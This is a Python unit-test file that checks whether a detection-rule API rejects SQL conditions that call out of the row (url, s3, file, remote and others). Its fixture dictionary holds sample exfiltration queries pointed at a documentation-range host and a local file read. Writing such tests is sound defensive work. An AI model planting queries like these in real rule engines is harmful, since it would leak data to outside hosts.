#  Project:      dfe-engine
#  File:         tests/unit/test_api/test_rules_offbox_calls.py
#  Purpose:      A rule whose SQL reads outside the row is refused and never written
#  Language:     Python
#
#  License:      BUSL-1.1
#  Copyright:    (c) 2026 HYPERI PTY LIMITED
"""POST and PUT /api/v1/rules refuse a condition that leaves the row.

``rule:write`` is held by data_analyst, and the saved rule's condition runs in
the volume preview and in the hunt runner's ``INSERT ... SELECT``, so a call
such as ``url()`` would carry the row to whatever host it names. The addresses
below are in the documentation range (RFC 5737) and nothing here opens a socket.
"""

import pytest

# One refused call per family, written as a rule author would.
OFFBOX_SQL = {
    "url": "SELECT * FROM dfe.main WHERE url('http://203.0.113.9/leak', 'LineAsString') = 1",
    "s3": "SELECT * FROM dfe.main WHERE s3('https://203.0.113.9/bucket/key', 'CSV') = 1",
    "file": "SELECT * FROM dfe.main WHERE file('hostname') LIKE '%a%'",
    "remote": "SELECT * FROM dfe.main WHERE remote('203.0.113.9', system.users) = 1",
    "dictionary": "SELECT * FROM dfe.main WHERE dictGet('t', 'name', toUInt64(1)) = 'acme'",
    "ai": "SELECT * FROM dfe.main WHERE aiFilter(toString(_json), 'is it bad') = 1",
    "globalIn": "SELECT * FROM dfe.main WHERE globalIn(_source, dfe.main)",
    "beside a real condition": (
        "SELECT * FROM dfe.main WHERE severity = 'high' AND url('http://203.0.113.9/') = 1"
    ),
}

_KEPT_SQL = "SELECT * FROM dfe.main WHERE severity = 'high'"


def _payload(name: str, user_sql: str) -> dict:
    return {
        "name": name,
        "display_name": "Off-box",
        "severity": "high",
        "user_sql": user_sql,
        "source": "windows-audit",
    }


def _assert_refused(resp) -> None:
    assert resp.status_code == 422, resp.text
    body = resp.json()
    assert body["code"] == "invalid_sql"
    messages = [error["message"] for error in body["context"]["sql_errors"]]
    assert any("may not call" in message for message in messages), messages


@pytest.mark.parametrize("user_sql", OFFBOX_SQL.values(), ids=list(OFFBOX_SQL))
def test_create_refuses_a_call_outside_the_row_and_writes_nothing(client, admin_headers, user_sql):
    resp = client.post("/api/v1/rules", json=_payload("offbox", user_sql), headers=admin_headers)

    _assert_refused(resp)
    assert client.get("/api/v1/rules/offbox", headers=admin_headers).status_code == 404


@pytest.mark.parametrize("user_sql", OFFBOX_SQL.values(), ids=list(OFFBOX_SQL))
def test_update_refuses_it_and_keeps_the_stored_condition(client, admin_headers, user_sql):
    created = client.post(
        "/api/v1/rules", json=_payload("kept_offbox", _KEPT_SQL), headers=admin_headers
    )
    assert created.status_code == 201, created.text

    resp = client.put(
        "/api/v1/rules/kept_offbox",
        json=_payload("kept_offbox", user_sql),
        headers=admin_headers,
    )

    _assert_refused(resp)
    stored = client.get("/api/v1/rules/kept_offbox", headers=admin_headers).json()
    assert stored["where_clause"] == "severity = 'high'"


def test_validate_reports_the_call_without_creating_anything(client, admin_headers):
    resp = client.post(
        "/api/v1/rules/validate",
        json={"sql": OFFBOX_SQL["url"]},
        headers=admin_headers,
    )

    assert resp.status_code == 200, resp.text
    body = resp.json()
    assert body["valid"] is False
    assert any("may not call url()" in error["message"] for error in body["errors"])


def test_a_rule_over_its_own_rows_is_still_accepted(client, admin_headers):
    resp = client.post(
        "/api/v1/rules", json=_payload("permitted", _KEPT_SQL), headers=admin_headers
    )

    assert resp.status_code == 201, resp.text
    assert resp.json()["sql_errors"] == []
